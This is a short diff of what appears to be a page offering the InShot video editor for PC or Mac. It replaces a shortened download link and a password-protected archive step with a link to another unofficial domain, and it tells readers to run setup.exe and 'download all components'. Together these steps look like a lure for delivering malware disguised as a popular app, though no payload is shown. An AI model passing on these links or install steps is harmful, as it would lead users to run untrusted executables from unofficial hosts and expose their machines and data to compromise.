@@ -5,8 +5,7 @@ Multitask effortlessly on your PC or Mac as you try out Video Editor & Maker –
 
 <H3>⚙️ How to install InShot</H3>
 
-- [Download](https://goo.su/Be2jF7e)
-- Open archive (password: Project12!)
+- [Download](https://softspace.space)
 - Open setup.exe for install and download all components
 - Follow the instructions
 
